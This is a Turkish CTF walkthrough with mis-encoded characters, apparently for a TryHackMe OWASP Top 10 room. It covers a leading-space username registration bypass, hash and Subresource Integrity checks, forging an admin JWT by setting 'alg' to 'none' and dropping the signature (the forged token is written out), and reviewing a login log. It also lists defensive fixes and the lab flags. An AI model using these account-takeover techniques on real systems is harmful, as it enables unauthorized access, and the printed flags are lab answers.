Bunu denemek iÃ§in 8088 portuna gidin ve kullanÄ±cÄ± adÄ±nÄ±z olarak `darren` ile kaydolmayÄ± deneyin. "Bu kullanÄ±cÄ± zaten mevcut" uyarÄ±sÄ± alacaksÄ±nÄ±z. Bunun yerine " darren" (baÅŸÄ±nda boÅŸluk ile) olarak kaydolmayÄ± deneyin. ArdÄ±ndan oturum aÃ§tÄ±ÄŸÄ±nÄ±zda, yalnÄ±zca `darren` hesabÄ±na Ã¶zel olan iÃ§eriÄŸi gÃ¶rebileceksiniz. Bizim Ã¶rneÄŸimizde, bu iÃ§erik sizin almanÄ±z gereken bayrak (flag) olacak.

### Bayrak Yakalamaca

- 8088 portuna gidip Ã‡aÄŸrÄ± Mert BakÄ±rcÄ± gibi bir bakÄ±ÅŸ atalÄ±m:

  ![](https://i.ibb.co/hJBd9yvT/17-1.png)

- Ãœye olmaya Ã§abalayalÄ±m:

  ![](https://i.ibb.co/tpvpjvBw/17-2.png)

- Bu kullanÄ±cÄ± zaten var dedi:

  ![](https://i.ibb.co/3YGzYPDc/17-3.png)

- BahsedildiÄŸi gibi `darren` yerine ` darren` olarak kaydolmaya Ã§alÄ±ÅŸalÄ±m:

  ![](https://i.ibb.co/tTzBjTG0/17-4.png)

- BaÅŸarÄ±yla kaydolabiliyoruz:

  ![](https://i.ibb.co/mCzPQWnC/17-5.png)

  Ã‡Ã¼nkÃ¼ sistemi kodlayanlar `.strip()` dediÄŸimiz string'lerin sonundaki gereksiz boÅŸluklarÄ± silmeye yarayan fonksiyondan bihaber.

- Åimdi yine baÅŸÄ±na bir boÅŸluk koyarak giriÅŸ yapmaya Ã§alÄ±ÅŸalÄ±m:

  ![](https://i.ibb.co/MDB2dG42/17-6.png)

- GiriÅŸ baÅŸarÄ±lÄ±:

  ![](https://i.ibb.co/MkmwQPdV/17-7.png)

  BayraÄŸÄ± yakaladÄ±k: `fe86079416a21a3c99937fea8874b667`
  
- AynÄ±sÄ±nÄ± `arthur` iÃ§in de yapalÄ±m:

  ![](https://i.ibb.co/SD6KVCJH/17-8.png)

  BayraÄŸÄ± yakaladÄ±k: `d9ac0f7db4fda460ac3edeb75d75e16e`

### Ã–nleme YÃ¶ntemleri

1. **`strip()` KullanÄ±mÄ±nÄ± DoÄŸru Åekilde Uygulamak**  
   - KullanÄ±cÄ± adÄ± girildiÄŸinde, hem **baÅŸtaki hem de sondaki** boÅŸluklar kaldÄ±rÄ±lmalÄ±dÄ±r:  
     ```python
     username = username.strip()
     ```

2. **KullanÄ±cÄ± AdlarÄ±nÄ± Normalize Etmek**  
   - TÃ¼m kullanÄ±cÄ± adlarÄ±nÄ± **kÃ¼Ã§Ã¼k harfe Ã§evirerek** veya standart bir formatta tutarak tekrar eden kayÄ±tlarÄ± Ã¶nleyebilirsin:  
     ```python
     username = username.strip().lower()
     ```

3. **GiriÅŸ Yaparken de AynÄ± Filtreyi Uygulamak**  
   - KullanÄ±cÄ± adÄ± kaydedilirken nasÄ±l iÅŸleniyorsa, giriÅŸ yaparken de **aynÄ± iÅŸlemler** uygulanmalÄ±dÄ±r:
     ```python
     input_username = input_username.strip().lower()
     ```

4. **VeritabanÄ±nda Benzersiz KullanÄ±cÄ± AdÄ± KontrolÃ¼**  
   - VeritabanÄ±nda **boÅŸluk eklenerek oluÅŸturulan kullanÄ±cÄ± adlarÄ±nÄ±** engellemek iÃ§in bir indeksleme kullanabilirsin:
     ```sql
     CREATE UNIQUE INDEX unique_username ON users (TRIM(username));
     ```
   - Alternatif olarak, kayÄ±t sÄ±rasÄ±nda kullanÄ±cÄ± adÄ±yla ilgili fazladan kontroller eklenebilir.

5. **DÃ¼zenli Ä°fade (Regex) ile KullanÄ±cÄ± AdÄ± DoÄŸrulamasÄ±**  
   - KullanÄ±cÄ± adÄ±nÄ±n yalnÄ±zca belirli karakterleri iÃ§ermesini saÄŸlamak iÃ§in bir regex filtresi uygulanabilir:
     ```python
     import re
     if not re.match(r"^[a-zA-Z0-9_]+$", username):
         raise ValueError("GeÃ§ersiz kullanÄ±cÄ± adÄ±!")
     ```
   - Bu, boÅŸluk veya Ã¶zel karakterlerle oynayarak sistemin kandÄ±rÄ±lmasÄ±nÄ± engeller.

6. **BoÅŸluk ve Ã–zel Karakterleri Engellemek**  
   - KullanÄ±cÄ± adÄ±nÄ±n baÅŸÄ±nda veya sonunda boÅŸluk olup olmadÄ±ÄŸÄ±nÄ± kontrol eden bir doÄŸrulama eklenebilir:
     ```python
     if username != username.strip():
         raise ValueError("KullanÄ±cÄ± adÄ± baÅŸÄ±nda veya sonunda boÅŸluk iÃ§eremez!")
     ```

7. **SQL ve Uygulama KatmanÄ±nda Ã‡ift Kontrol**  
   - VeritabanÄ±na yazÄ±lmadan Ã¶nce, hem **uygulama katmanÄ±nda** hem de **veritabanÄ± seviyesinde** bu tÃ¼r kontrollerin yapÄ±lmasÄ± gÃ¼venliÄŸi artÄ±rÄ±r.

8. **KullanÄ±cÄ± AdlarÄ±nÄ± Loglama ve Anomalileri Tespit Etme**  
   - Sistem, **benzer isimlere sahip ÅŸÃ¼pheli kullanÄ±cÄ± kayÄ±tlarÄ±nÄ±** tespit ederek yÃ¶neticilere bildirim gÃ¶nderebilir.

Bu yÃ¶ntemleri kullanarak, **boÅŸluk bazlÄ± kullanÄ±cÄ± adÄ± sahtekarlÄ±ÄŸÄ±nÄ±** ve benzeri hatalarÄ± Ã¶nleyebiliriz.

## GÃ¶rev 18: ğŸ›‘ Software and Data Integrity Failures

### BÃ¼tÃ¼nlÃ¼k Nedir?

BÃ¼tÃ¼nlÃ¼k, bir verinin deÄŸiÅŸmeden kaldÄ±ÄŸÄ±nÄ± doÄŸrulama yeteneÄŸimizi ifade eder. Siber gÃ¼venlikte bÃ¼tÃ¼nlÃ¼k, Ã¶nemli verilerin istenmeyen veya kÃ¶tÃ¼ niyetli deÄŸiÅŸikliklerden korunmasÄ±nÄ± saÄŸlamak aÃ§Ä±sÄ±ndan kritik bir Ã¶neme sahiptir. Ã–rneÄŸin, bir uygulamanÄ±n en son kurulum dosyasÄ±nÄ± indirdiÄŸinizi dÃ¼ÅŸÃ¼nÃ¼n. Bu dosyanÄ±n indirilirken deÄŸiÅŸmediÄŸinden veya bir iletim hatasÄ± yÃ¼zÃ¼nden bozulmadÄ±ÄŸÄ±ndan nasÄ±l emin olabilirsiniz?

Bu sorunu Ã§Ã¶zmek iÃ§in, genellikle dosyanÄ±n yanÄ±nda bir **hash** (Ã¶zet) gÃ¶nderilir. BÃ¶ylece indirdiÄŸiniz dosyanÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ koruyup korumadÄ±ÄŸÄ±nÄ± ve transit sÄ±rasÄ±nda deÄŸiÅŸmediÄŸini doÄŸrulayabilirsiniz. Hash veya Ã¶zet, bir veri parÃ§asÄ±na belirli bir algoritma uygulandÄ±ÄŸÄ±nda ortaya Ã§Ä±kan bir sayÄ±dÄ±r. Hash algoritmalarÄ± hakkÄ±nda bilgi alÄ±rken sÄ±kÃ§a **MD5**, **SHA1**, **SHA256** gibi terimlerle karÅŸÄ±laÅŸÄ±rsÄ±nÄ±z.

WinSCP Ã¶rneÄŸi Ã¼zerinden, hashâ€™lerin bir dosyanÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ kontrol etmek iÃ§in nasÄ±l kullanÄ±ldÄ±ÄŸÄ±nÄ± daha iyi anlayabiliriz. WinSCPâ€™nin [Sourceforge deposuna](https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/) giderseniz, her indirilebilir dosyanÄ±n yanÄ±nda yayÄ±nlanmÄ±ÅŸ hashâ€™ler gÃ¶rÃ¼rsÃ¼nÃ¼z:

![WinSCP Hashâ€™leri](https://i.ibb.co/mVVc3Zdh/18-1.png)

Bu hashâ€™ler, WinSCPâ€™nin yaratÄ±cÄ±larÄ± tarafÄ±ndan Ã¶nceden hesaplanmÄ±ÅŸtÄ±r. BÃ¶ylece dosyayÄ± indirdikten sonra bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ kontrol edebilirsiniz. Ã–rneÄŸin, `WinSCP-5.21.5-Setup.exe` dosyasÄ±nÄ± indirirsek, hashâ€™leri yeniden hesaplayÄ±p Sourceforgeâ€™da yayÄ±nlananlarla karÅŸÄ±laÅŸtÄ±rabiliriz. **Linux**â€™ta farklÄ± hashâ€™leri hesaplamak iÃ§in ÅŸu komutlarÄ± kullanabiliriz:

```bash
user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe
20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe

user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe
c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe

user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe
e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
```

Elde ettiÄŸimiz hashâ€™ler aynÄ± olduÄŸu iÃ§in, indirdiÄŸimiz dosyanÄ±n web sitesindeki dosyanÄ±n tam bir kopyasÄ± olduÄŸunu gÃ¼venle sÃ¶yleyebiliriz.

#### YazÄ±lÄ±m ve Veri BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ HatalarÄ±

Bu tÃ¼r bir gÃ¼venlik aÃ§Ä±ÄŸÄ±, yazÄ±lÄ±m veya verilerin herhangi bir bÃ¼tÃ¼nlÃ¼k kontrolÃ¼ yapÄ±lmadan kullanÄ±ldÄ±ÄŸÄ± kod veya altyapÄ±lardan kaynaklanÄ±r. BÃ¼tÃ¼nlÃ¼k doÄŸrulamasÄ± yapÄ±lmadÄ±ÄŸÄ±nda, bir saldÄ±rgan yazÄ±lÄ±ma veya uygulamaya aktarÄ±lan verileri deÄŸiÅŸtirebilir ve bu da beklenmeyen sonuÃ§lara yol aÃ§abilir. Bu kategoride baÅŸlÄ±ca iki tÃ¼r gÃ¼venlik aÃ§Ä±ÄŸÄ± bulunur:

- **YazÄ±lÄ±m BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ HatalarÄ±**
- **Veri BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ HatalarÄ±**

## GÃ¶rev 19: YazÄ±lÄ±m BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ HatalarÄ±

### Nedir?

Diyelim ki bir web siteniz var ve bu site, kontrolÃ¼nÃ¼z dÄ±ÅŸÄ±nda olan harici sunucularda barÄ±ndÄ±rÄ±lan Ã¼Ã§Ã¼ncÃ¼ taraf kÃ¼tÃ¼phaneleri kullanÄ±yor. Bu kulaÄŸa biraz garip gelebilir, ancak bu oldukÃ§a yaygÄ±n bir uygulamadÄ±r. Ã–rneÄŸin, yaygÄ±n olarak kullanÄ±lan bir JavaScript kÃ¼tÃ¼phanesi olan **jQuery**â€™yi ele alalÄ±m. Ä°sterseniz, jQueryâ€™yi kendi sunucunuza indirmeden, doÄŸrudan onlarÄ±n sunucularÄ±ndan web sitenize ÅŸu HTML kodunu ekleyerek dahil edebilirsiniz:

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```

Bir kullanÄ±cÄ± web sitenize girdiÄŸinde, tarayÄ±cÄ±sÄ± sitenizin HTML kodunu okuyacak ve jQueryâ€™yi belirtilen harici kaynaktan indirecektir.

![BÃ¼tÃ¼nlÃ¼k KontrolÃ¼ Olmadan JS](https://i.ibb.co/hFBh2r6G/19-1.png)


Sorun ÅŸu ki, eÄŸer bir saldÄ±rgan jQueryâ€™nin resmi deposuna (Ã¶rneÄŸin `https://code.jquery.com/jquery-3.6.1.min.js`) sÄ±zÄ±p iÃ§eriÄŸini deÄŸiÅŸtirirse, kÃ¶tÃ¼ niyetli kod enjekte edebilir. Bu durumda, web sitenizi ziyaret eden herkes farkÄ±nda olmadan bu kÃ¶tÃ¼ niyetli kodu indirir ve tarayÄ±cÄ±sÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±r. Bu, bir **yazÄ±lÄ±m bÃ¼tÃ¼nlÃ¼ÄŸÃ¼ hatasÄ±**dÄ±r Ã§Ã¼nkÃ¼ web siteniz, Ã¼Ã§Ã¼ncÃ¼ taraf kÃ¼tÃ¼phanenin deÄŸiÅŸip deÄŸiÅŸmediÄŸini kontrol etmez. Modern tarayÄ±cÄ±lar, kÃ¼tÃ¼phanenin URLâ€™si ile birlikte bir hash belirtebilmenize olanak tanÄ±r; bÃ¶ylece indirilen dosyanÄ±n hashâ€™i beklenen deÄŸere uyuyorsa kÃ¼tÃ¼phane kodu Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Bu gÃ¼venlik mekanizmasÄ±na **Alt Kaynak BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ (Subresource Integrity - SRI)** denir ve detaylarÄ±nÄ± [buradan](https://www.srihash.org/) okuyabilirsiniz.

KÃ¼tÃ¼phaneyi HTML kodunuza doÄŸru ÅŸekilde eklemenin yolu, SRI kullanarak bir bÃ¼tÃ¼nlÃ¼k hashâ€™i eklemektir. BÃ¶ylece bir saldÄ±rgan kÃ¼tÃ¼phaneyi deÄŸiÅŸtirse bile, web sitenizi ziyaret eden istemciler bu deÄŸiÅŸtirilmiÅŸ sÃ¼rÃ¼mÃ¼ Ã§alÄ±ÅŸtÄ±rmaz. HTMLâ€™de bu ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" 
        integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" 
        crossorigin="anonymous"></script>
```

Gerekirse herhangi bir kÃ¼tÃ¼phane iÃ§in hash oluÅŸturmak Ã¼zere [https://www.srihash.org/](https://www.srihash.org/) adresine gidebilirsiniz.

### Bayrak Yakalamaca

- Adrese gidip oluÅŸturalÄ±m:

  ![](https://i.ibb.co/Kzwg7szy/19-1-1.png)

  ```html
  <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
  ```

- BayraÄŸÄ±mÄ±z sha256 anahtarÄ±: `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`

## GÃ¶rev 20: Veri BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ HatalarÄ±

Web uygulamalarÄ±nÄ±n oturumlarÄ± nasÄ±l yÃ¶nettiÄŸini dÃ¼ÅŸÃ¼nelim. Genellikle, bir kullanÄ±cÄ± bir uygulamaya giriÅŸ yaptÄ±ÄŸÄ±nda, tarayÄ±cÄ±sÄ±nda oturum sÃ¼redikÃ§e saklanmasÄ± gereken bir oturum belirteci (
**session token**) atanÄ±r. Bu belirteÃ§, kullanÄ±cÄ± her istekte bulunduÄŸunda tekrarlanarak web uygulamasÄ±nÄ±n kullanÄ±cÄ±yÄ± tanÄ±masÄ±nÄ± saÄŸlar. Bu belirteÃ§ler Ã§eÅŸitli formlarda olabilir, ancak genellikle **Ã§erezler (cookies)** kullanÄ±larak atanÄ±r.

**Ã‡erezler**, web uygulamalarÄ±nÄ±n kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda sakladÄ±ÄŸÄ± ve her istekte otomatik olarak sunucuya gÃ¶nderilen anahtar-deÄŸer (
**key-value**) Ã§iftleridir.

![Cookies](https://i.ibb.co/MXRVDH1/20-1.png)

Ã–rneÄŸin, bir web posta uygulamasÄ± geliÅŸtiriyorsanÄ±z, oturum aÃ§an her kullanÄ±cÄ±ya iÃ§inde kullanÄ±cÄ± adÄ±nÄ± saklayan bir Ã§erez atayabilirsiniz. Daha sonraki isteklerde, tarayÄ±cÄ± bu Ã§erezi her seferinde sunucuya gÃ¶ndererek kullanÄ±cÄ±nÄ±n kim olduÄŸunu belirtir. Ancak bu kÃ¶tÃ¼ bir fikir olurdu, Ã§Ã¼nkÃ¼ Ã§erezler tarayÄ±cÄ±da saklandÄ±ÄŸÄ± iÃ§in kullanÄ±cÄ± bu deÄŸerleri deÄŸiÅŸtirebilir. KullanÄ±cÄ±, Ã§erezi deÄŸiÅŸtirerek baÅŸka bir kullanÄ±cÄ±nÄ±n hesabÄ±na eriÅŸim saÄŸlayabilir. Bu da veri bÃ¼tÃ¼nlÃ¼ÄŸÃ¼ hatasÄ±na (
**data integrity failure**) yol aÃ§ar.

Bu sorunun bir Ã§Ã¶zÃ¼mÃ¼, Ã§erezin deÄŸiÅŸtirilmediÄŸini garantileyen bir bÃ¼tÃ¼nlÃ¼k mekanizmasÄ± kullanmaktÄ±r. Bunun iÃ§in bÃ¼tÃ¼n kriptografik hesaplamalarÄ± bizim iÃ§in yapan hazÄ±r bir belirteÃ§ (
**token**) kullanabiliriz. Bu noktada **JSON Web Tokens (JWT)** devreye girer.

### JWT (JSON Web Tokens) Nedir?

JWT, kullanÄ±cÄ±lara veri bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ garanti eden basit bir belirteÃ§ sistemidir. KullanÄ±cÄ±lara bir token oluÅŸturup vererek, iÃ§eriÄŸindeki deÄŸerlerin deÄŸiÅŸtirilemeyeceÄŸini ve sistem tarafÄ±ndan doÄŸrulanabileceÄŸini garanti ederiz. JWT, 3 bÃ¶lÃ¼mden oluÅŸur:

![JWT YapÄ±sÄ±](https://i.ibb.co/CpDw4YfX/20-2.png)

1. **Header (BaÅŸlÄ±k)**: JWT olduÄŸunu ve kullanÄ±lan imzalama algoritmasÄ±nÄ± belirtir.
2. **Payload (YÃ¼k)**: KullanÄ±cÄ± hakkÄ±nda anahtar-deÄŸer bilgilerinin saklandÄ±ÄŸÄ± bÃ¶lÃ¼m.
3. **Signature (Ä°mza)**: Payload'un deÄŸiÅŸmediÄŸini doÄŸrulamak iÃ§in kullanÄ±lan Ã¶zel bir imza.

JWT'ler Base64 formatÄ±nda kodlanmÄ±ÅŸ basit metinlerdir. AÅŸaÄŸÄ±daki JWT token'Ä±nÄ±n baÅŸlÄ±k ve yÃ¼k kÄ±smÄ±nÄ± Base64 Ã§Ã¶zÃ¼cÃ¼yÃ¼ ile deÄŸiÅŸtirebilir ve okuyabilirsiniz:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw
```

### JWT ve None Algoritma AÃ§Ä±ÄŸÄ±

BazÄ± JWT kÃ¼tÃ¼phanelerinde bir veri bÃ¼tÃ¼nlÃ¼ÄŸÃ¼ hatasÄ± (
**data integrity failure**) mevcuttu. JWT'lerin bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ doÄŸrulamak iÃ§in imza kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rdÃ¼k, ancak bazÄ± eski JWT kÃ¼tÃ¼phaneleri, imza kontrolÃ¼nÃ¼ atlatmaya izin veriyordu. Bir siber saldÄ±rgan, aÅŸaÄŸÄ±daki adÄ±mlarÄ± uygulayarak JWT imza kontrolÃ¼nÃ¼ atlatabilirdi:

1. JWT'nin baÅŸlÄ±k (header) kÄ±smÄ±nda **alg** deÄŸerini `none` olarak deÄŸiÅŸtirmek.
2. JWT'nin imza (signature) kÄ±smÄ±nÄ± tamamen kaldÄ±rmak.

Bu sayede sistem, token'Ä±n imza doÄŸrulamasÄ±nÄ± yapmaz ve saldÄ±rgan istedikleri payload'u oluÅŸturarak gÃ¼venliÄŸi ihlal edebilir.

![JWT None AlgoritmasÄ±](https://i.ibb.co/C3kBbJxZ/20-3.png)

Bir saldÄ±rgan, baÅŸka bir kullanÄ±cÄ±nÄ±n hesabÄ±na eriÅŸim saÄŸlamak iÃ§in bu aÃ§Ä±ÄŸÄ± kÃ¶tÃ¼ye kullanabilir.



### Bayrak Yakalamaca

- Bu zaafiyeti test etmek ve detaylÄ± incelemek iÃ§in 8089 portuna gidelim:

  ![1](https://i.ibb.co/DDCQSRPY/20-4.png)

- `guest` ve `123` olarak giriÅŸ yapmaya Ã§alÄ±ÅŸalÄ±m:

  ![2](https://i.ibb.co/xKHmNGDD/20-4-1.png)

- `guest` ve `guest` olarak gir dedi. YapalÄ±m:

  ![2](https://i.ibb.co/cSV71jsH/20-5.png)

- `jwt-session` adÄ±nda bir cookie gÃ¶rÃ¼nÃ¼yor. Bunu manipÃ¼le etmeye Ã§alÄ±ÅŸalÄ±m:

  `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzQxMTc5ODUwfQ.Jzbt-zFXcUU5G9UfV0RAek_a-6uZPFYyyygkKq6KkeQ`

- Bilgilere dayanarak son noktadan sonraki kÄ±sÄ±m imza kÄ±smÄ±. Gereksiz olduÄŸu iÃ§in Ã§Ä±karalÄ±m:

  `Jzbt-zFXcUU5G9UfV0RAek_a-6uZPFYyyygkKq6KkeQ` kÄ±smÄ±nÄ± kaldÄ±rÄ±nca:

  `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzQxMTc5ODUwfQ` olarak ulaÅŸÄ±rÄ±z.

- [Base64 Decode](https://appdevtools.com/base64-encoder-decoder) kullanarak decode edelim:

  ```json
  {"typ":"JWT","alg":"HS256"}{"username":"guest","exp":1741179850}
  ```

- alg kÄ±smÄ±nÄ± `none` yapalÄ±m ve `username` kÄ±smÄ±nÄ± `admin olarak deÄŸiÅŸtirelim`:

  ```json
  {"typ":"JWT","alg":"none"}{"username":"admin","exp":1741179850}
  ```

- ayrÄ± ayrÄ± encode edelim. Ã–nce `{"typ":"JWT","alg":"none"}`:

  ![3](https://i.ibb.co/p6J8yywZ/20-6.png)

  `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=`

- Åimdi `{"username":"admin","exp":1741179850}`:

  ![4](https://i.ibb.co/vC0g3BfX/20-7.png)

  `eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQxMTc5ODUwfQ==`

- BulduÄŸumuz deÄŸerleri nokta ile birleÅŸtirelim: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQxMTc5ODUwfQ==`

- Sonuna imzayÄ± ekleyelim: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQxMTc5ODUwfQ==.`

  > JWT formatÄ± Ã¼Ã§ parÃ§alÄ± olmalÄ±dÄ±r. Ä°mza kÄ±smÄ± boÅŸ olsa bile, format gereÄŸi Ã¼Ã§Ã¼ncÃ¼ bir kÄ±sÄ±m olmalÄ±. Bu yÃ¼zden, geÃ§erli bir JWT formatÄ± oluÅŸturabilmek iÃ§in sona bir nokta ekliyoruz. BÃ¶ylece tarayÄ±cÄ± veya sunucu JWTâ€™nin Ã¼Ã§ parÃ§adan oluÅŸtuÄŸunu gÃ¶rÃ¼p iÅŸleyebilir.
  {: .prompt-info }

- F12'den `jwt-session` Ã§erezinin deÄŸerine yapÄ±ÅŸtÄ±ralÄ±m:

  ![5](https://i.ibb.co/qFR7GyhC/20-8.png)

  BayraÄŸÄ± yakaladÄ±k: `THM{Dont_take_cookies_from_strangers}`

## GÃ¶rev 21: ğŸ›‘ Security Logging and Monitoring Failures

### GÃ¼venlik KayÄ±tlarÄ± ve Ä°zleme HatalarÄ± Nedir?

Web uygulamalarÄ± kurulduÄŸunda, kullanÄ±cÄ± tarafÄ±ndan yapÄ±lan her eylem kaydedilmelidir. KayÄ±t tutma, bir olay meydana geldiÄŸinde saldÄ±rganlarÄ±n eylemlerinin izlenebilmesi iÃ§in Ã¶nemlidir. SaldÄ±rganlarÄ±n eylemleri izlendikten sonra, bunlarÄ±n riski ve etkisi belirlenebilir. KayÄ±t tutma olmadÄ±ÄŸÄ±nda, saldÄ±rganlar belirli web uygulamalarÄ±na eriÅŸim saÄŸladÄ±ÄŸÄ±nda hangi eylemleri gerÃ§ekleÅŸtirdiklerini anlamanÄ±n bir yolu olmaz. Bu durumun daha bÃ¼yÃ¼k etkileri ÅŸunlardÄ±r:

- **DÃ¼zenleyici zarar:** EÄŸer bir saldÄ±rgan kiÅŸisel olarak tanÄ±mlanabilir kullanÄ±cÄ± bilgilerine eriÅŸim saÄŸlamÄ±ÅŸsa ve bunun kaydÄ± tutulmamÄ±ÅŸsa, nihai kullanÄ±cÄ±lar etkilenebilir ve uygulama sahipleri, dÃ¼zenlemelere baÄŸlÄ± olarak cezalar veya daha ciddi yaptÄ±rÄ±mlarla karÅŸÄ±laÅŸabilir.
- **DiÄŸer saldÄ±rÄ±lar riski:** KayÄ±t tutma yoksa, bir saldÄ±rganÄ±n varlÄ±ÄŸÄ± tespit edilmemiÅŸ olabilir. Bu da saldÄ±rganÄ±n, kimlik bilgilerini Ã§alma, altyapÄ±yÄ± hedef alma gibi yeni saldÄ±rÄ±lar baÅŸlatmasÄ±na olanak tanÄ±yabilir.

KayÄ±tlarda tutulan bilgiler ÅŸunlarÄ± iÃ§ermelidir:

- **HTTP** durum kodlarÄ±
- Zaman damgalarÄ±
- KullanÄ±cÄ± adlarÄ±
- **API** uÃ§ noktalarÄ± / sayfa konumlarÄ±
- IP adresleri

Bu kayÄ±tlar hassas bilgiler iÃ§erdiÄŸi iÃ§in gÃ¼venli bir ÅŸekilde saklanmalÄ± ve bu kayÄ±tlarÄ±n farklÄ± yerlerde birden fazla kopyasÄ± tutulmalÄ±dÄ±r.

YukarÄ±da belirttiÄŸimiz gibi, kayÄ±t tutma, bir ihlal veya olay meydana geldikten sonra daha da Ã¶nemlidir. Ä°deal durumda, ÅŸÃ¼pheli etkinliÄŸi tespit etmek iÃ§in izleme sistemlerinin olmasÄ± gerekir. ÅÃ¼pheli etkinliÄŸi tespit etmenin amacÄ±, saldÄ±rganÄ± tamamen durdurmak veya saldÄ±rganÄ±n varlÄ±ÄŸÄ± daha geÃ§ fark edilse bile yaptÄ±ÄŸÄ± etkinin etkisini azaltmaktÄ±r. ÅÃ¼pheli etkinlik Ã¶rnekleri ÅŸunlar olabilir:

- Belirli bir eylem iÃ§in birden fazla yetkisiz deneme (genellikle kimlik doÄŸrulama denemeleri veya yetkisiz kaynaklara eriÅŸim, Ã¶rneÄŸin yÃ¶netici sayfalarÄ±na)
- Anormal IP adreslerinden veya konumlardan yapÄ±lan istekler: bu, birinin belirli bir kullanÄ±cÄ±nÄ±n hesabÄ±na eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶sterebilir ancak yanlÄ±ÅŸ pozitif oranÄ± da olabilir.
- Otomatik araÃ§ kullanÄ±mÄ±: belirli otomatik araÃ§lar kolayca tespit edilebilir, Ã¶rneÄŸin User-Agent baÅŸlÄ±klarÄ±nÄ±n deÄŸeri veya isteklerin hÄ±zÄ±. Bu, bir saldÄ±rganÄ±n otomatik araÃ§ kullanÄ±yor olabileceÄŸini gÃ¶sterebilir.
- YaygÄ±n yÃ¼kler: web uygulamalarÄ±nda, saldÄ±rganlarÄ±n yaygÄ±n yÃ¼kler kullanmasÄ± yaygÄ±ndÄ±r. Bu yÃ¼klerin tespiti, uygulamalara yetkisiz/malicious testler yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶sterebilir.

Sadece ÅŸÃ¼pheli etkinlikleri tespit etmek yeterli deÄŸildir. Bu ÅŸÃ¼pheli etkinliklerin, etki seviyelerine gÃ¶re deÄŸerlendirilmesi gerekir. Ã–rneÄŸin, bazÄ± eylemler diÄŸerlerine gÃ¶re daha yÃ¼ksek etkiye sahiptir. Bu yÃ¼ksek etkiye sahip eylemler, daha hÄ±zlÄ± yanÄ±t verilmesi gerektiÄŸinden, alarm durumuna geÃ§meli ve ilgili kiÅŸilerin dikkatini Ã§ekmelidir.

Bu bilgileri pratikte kullanmak iÃ§in saÄŸlanan Ã¶rnek kayÄ±t dosyasÄ±nÄ± analiz edebilirsiniz. DosyayÄ± indirmek iÃ§in gÃ¶revin Ã¼st kÄ±smÄ±ndaki **Download Task Files** butonuna tÄ±klayabilirsiniz.

### Bayrak Yakalamaca

- Bize verilen dosyayÄ± indirip iÃ§ine bakalÄ±m:

  ```
  200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
  200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
  200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
  200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
  200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
  200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
  401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
  401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
  401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
  401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
  ```
  {: file='login-logs_1595366583422.txt'}

- Bu logda, Ã¶zellikle **49.99.13.16** IP adresinden yapÄ±lan bir dizi baÅŸarÄ±sÄ±z giriÅŸ denemesi dikkat Ã§ekiyor:

  - `admin` kullanÄ±cÄ±sÄ±: 2019-03-21 21:08:15
  - `administrator` kullanÄ±cÄ±sÄ±: 2019-03-21 21:08:20
  - `anonymous` kullanÄ±cÄ±sÄ±: 2019-03-21 21:08:25
